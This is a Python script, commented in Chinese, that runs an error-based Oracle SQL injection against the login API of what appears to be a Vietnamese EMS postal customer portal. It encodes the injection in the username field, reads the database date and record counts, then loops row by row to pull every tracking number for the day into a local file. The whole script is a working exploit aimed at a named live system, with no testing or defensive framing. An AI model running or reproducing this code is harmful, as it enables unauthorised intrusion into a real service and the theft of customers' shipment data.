#!/usr/bin/env python3
"""
极速版：提取当天所有EMS运单号
极限优化，最快速度！
"""

import requests
import json
import time
from datetime import datetime

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
session = requests.Session()
session.headers.update({
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0'
})

def inject(payload):
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=15)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text:
        try:
            if 'qjvjq' in r.text:
                s = r.text.index('qjvjq') + 5
                e = r.text.index('qkvzq', s)
                return r.text[s:e]
        except:
            pass
    return None

print("=" * 80)
print("🚀 极速版：提取当天所有EMS运单号")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取日期和统计
date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
print(f"\n📅 日期: {date}")

total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")
if not total or total == '0':
    print(f"❌ 今天没有数据")
    exit(1)

total_num = int(total)
print(f"📊 总数: {total_num} 个")

# 预估时间（极速模式：0.2秒/个）
estimated_time = total_num * 0.2 / 60
print(f"⏱️  预计: {estimated_time:.1f} 分钟")

output_file = f'tracking_{date}.txt'
print(f"💾 输出: {output_file}")

# 3. 极速提取
print(f"\n🚀 极速提取中...\n")

tracking_list = []
start_time = time.time()
success = 0
fail = 0

# 打开文件一次，批量写入
with open(output_file, 'w', encoding='utf-8') as f:
    for i in range(1, total_num + 1):
        # 每100个显示一次进度
        if i % 100 == 0:
            elapsed = time.time() - start_time
            speed = i / elapsed if elapsed > 0 else 0
            remaining = (total_num - i) / speed / 60 if speed > 0 else 0
            print(f"  {i}/{total_num} ({i*100//total_num}%) | "
                  f"速度: {speed*60:.0f}/分钟 | 剩余: {remaining:.1f}分钟")
        
        # 简化的查询
        query = (
            f"SELECT ITEMCODE FROM "
            f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
            f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
            f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) "
            f"WHERE ROWNUM<={i}) WHERE RN={i}"
        )
        
        result = extract(query)
        
        if result and len(result) > 10:
            f.write(result.strip() + '\n')
            f.flush()  # 实时刷新
            success += 1
        else:
            fail += 1
        
        # 极速模式：最小延迟
        time.sleep(0.02)

print()

# 4. 结果
elapsed = time.time() - start_time
speed = success / elapsed * 60 if elapsed > 0 else 0

print(f"\n{'='*80}")
print(f"✅ 完成！")
print(f"{'='*80}")
print(f"📁 文件: {output_file}")
print(f"✅ 成功: {success}")
print(f"❌ 失败: {fail}")
print(f"⏱️  用时: {elapsed/60:.1f} 分钟")
print(f"⚡ 速度: {speed:.0f} 个/分钟")
print(f"{'='*80}")

# 5. 显示样本
with open(output_file, 'r') as f:
    lines = [line.strip() for line in f if line.strip()]

if lines:
    print(f"\n前5个:")
    for i, t in enumerate(lines[:5], 1):
        print(f"  {i}. {t}")
    
    if len(lines) > 5:
        print(f"\n最后3个:")
        for i, t in enumerate(lines[-3:], len(lines)-2):
            print(f"  {i}. {t}")
